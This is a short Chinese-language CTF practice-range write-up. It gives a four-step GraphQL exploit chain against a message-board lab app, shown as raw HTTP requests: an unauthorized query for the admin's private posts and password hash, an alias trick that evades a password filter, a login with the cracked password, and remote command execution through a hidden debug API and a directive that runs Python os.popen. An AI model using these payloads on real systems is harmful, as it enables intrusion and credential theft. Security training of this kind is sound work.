## GraphQL 靶场

场景为经典的留言板, 但是采用 graphql 实现, 漏洞利用路径如下  

1. 越权查 admin 的 private post, 同时带上 password 这个 field

```
POST /graphql HTTP/1.1
Host: 172.25.0.2:5000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 291
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyYXNkIn0.j0DENnxcIRTz9kgBB020Twq00kJAbPXI4Dk49rSjdjo

{"query":"query privatePost {\n    privatePost (userId: 1, startIdx: 0, count: 1024) {\n        id \n        title \n        content \n        public \n        authorId \n        author {\n            id \n            username \n            password \n            \n        }\n    }\n}"}
```

2. 通过别名绕过 password 的替换字符串防御

```
POST /graphql HTTP/1.1
Host: 172.25.0.2:5000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 291
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJyYXNkIn0.j0DENnxcIRTz9kgBB020Twq00kJAbPXI4Dk49rSjdjo

{"query":"query privatePost {\n    privatePost (userId: 1, startIdx: 0, count: 1024) {\n        id \n        title \n        content \n        public \n        authorId \n        author {\n            id \n            username \n            asd:password \n            \n        }\n    }\n}"}
```

3. 查询 cmd5 得到 admin 密码 `pizzicato5`, 登录上 admin

```
POST /graphql HTTP/1.1
Host: 172.25.0.2:5000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 141

{"query":"mutation loginUser {\n    loginUser (password: \"pizzicato5\", username: \"admin\") {\n        success \n        token \n    }\n}"}
```

4. 通过插件或者手动翻, 找到隐藏的 API `debugSystem` + 再找到系统自己添加的 directive 来进行 RCE

```
POST /graphql HTTP/1.1
Host: 172.25.0.2:5000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 130
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.fGk2TIK2XuAHIMTnTYeBnc6CqSxZQZz0JD7qvRs9oQ8

{"query":"query debugSystem {\n    debugSystem (inputStr: \"test\") @map(mapper:\"__import__('os').popen('ls').read()\") \n}"}```
